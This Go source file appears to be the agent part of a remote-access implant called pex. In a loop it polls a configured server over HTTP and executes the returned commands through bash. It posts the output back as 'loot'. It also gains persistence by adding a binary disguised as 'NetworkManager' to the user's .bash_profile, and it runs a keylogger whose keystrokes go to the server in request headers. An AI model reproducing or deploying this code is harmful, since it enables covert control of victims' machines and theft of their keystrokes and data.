package agent

import (
	"bytes"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/hardal7/pex/internal/config"
)

var username string
var isLoggingKeys bool

func getUsername() string {
	if username == "" {
		slog.Info("Getting username")
		username, _ = executeCommand([]string{"whoami"})
	}
	return strings.TrimSpace(username)
}

func executeCommand(command []string) (string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	var commandExists bool = false
	var cmd *exec.Cmd
	if len(command) != 0 {
		command = append([]string{"-c"}, strings.Join(command, " "))
		cmd = exec.Command("bash", command...)
		commandExists = true
	}

	if commandExists {
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			slog.Error("Failed executing command: " + err.Error())
			fmt.Println(command)
		}
		slog.Info("Executed command")

	}
	slog.Info("Output:\n" + stdout.String())
	if stderr.String() != "" {
		slog.Info("Error Output: " + stderr.String())
	}

	return stdout.String(), stderr.String()
}

func queryCommand(command []string, ch chan string) []string {
	switch command[0] {
	case "INJECT":
		command =
			[]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"}
	case "LOGKEYS":
		command = []string{}
		isLoggingKeys = true
		go LogKeyboard(ch)
	}

	return command
}

func readKeys(request http.Request, ch chan string) {
	if isLoggingKeys {
		keys := <-ch
		if len(keys) != 0 {
			request.Header.Set("Keys", keys)
			keys = ""
			http.DefaultClient.Do(&request)
		}
	}
}

func makeRequest(ch chan string) {
	requestURL := "http://" + config.Host + ":" + config.Port
	request, _ := http.NewRequest("GET", requestURL, nil)
	username := getUsername()
	request.Header.Set("Username", username)
	go readKeys(*request, ch)

	response, err := http.DefaultClient.Do(request)
	if err != nil {
		slog.Info("Failed to send request to server: " + err.Error())
		return
	} else {
		slog.Info("Sent request to server")
	}

	body, _ := io.ReadAll(response.Body)
	command := strings.Fields(string(body[:]))
	command = queryCommand(command, ch)

	var out, errout string
	if string(body) != "" {
		slog.Info("Executing command: " + string(body))
		out, errout = executeCommand(command)
	}

	slog.Info("Sending loot to server")
	_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(out+errout)))
	if err != nil {
		slog.Info("Failed sending loot to server: " + err.Error())
	} else {
		slog.Info("Sent loot to server")
	}
}

func Serve() {
	ch := make(chan string)
	for {
		makeRequest(ch)
		time.Sleep(time.Duration(config.Interval) * time.Second)
	}
}
